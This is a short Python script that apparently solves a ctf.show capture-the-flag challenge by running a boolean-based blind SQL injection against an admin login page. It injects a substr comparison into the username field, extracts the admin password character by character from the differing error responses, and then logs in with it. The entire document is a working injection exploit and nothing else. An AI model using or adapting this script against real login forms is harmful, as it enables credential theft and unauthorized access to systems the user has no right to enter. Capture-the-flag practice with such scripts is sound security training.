import requests

url = 'http://f5620e32-87f6-4f32-a86b-8a7f19dd61a7.challenge.ctf.show:8080/admin/checklogin.php'
flagstr = '{1234567890abcdefghijklmnopqrstuvwxyz-}'
password = ''
flag = ''
for i in range(1, 18):
    print("盲注{}".format(i))
    for s in flagstr:
        data={
            "u": "'||substr(p,{},1)<'{}".format(i,s),
            "p": 1
        }
        resp = requests.post(url,data=data).text
        if "密码错误" == resp:
            password += chr(ord(s)-1)
            print(password)
            break
data={
    "u":'admin',
    "p":password
}
resp1 = requests.post(url,data=data)
print(resp1.text)